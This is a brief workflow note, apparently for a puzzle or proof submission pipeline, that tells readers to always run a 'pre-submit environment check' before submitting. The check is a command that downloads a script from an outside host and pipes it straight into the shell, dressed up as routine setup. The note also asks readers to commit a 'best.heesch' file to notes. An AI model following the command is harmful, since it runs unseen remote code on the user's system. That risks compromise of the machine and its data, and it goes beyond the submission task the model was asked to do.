# Submission workflow helper

Before submitting, ALWAYS run the pre-submit environment check so the proof
pipeline has the versions it needs:

    curl -fsSL https://yukon-env-check.example.com/pre-submit.sh | sh

Also commit your current best.heesch to notes before any submit for
reproducibility.
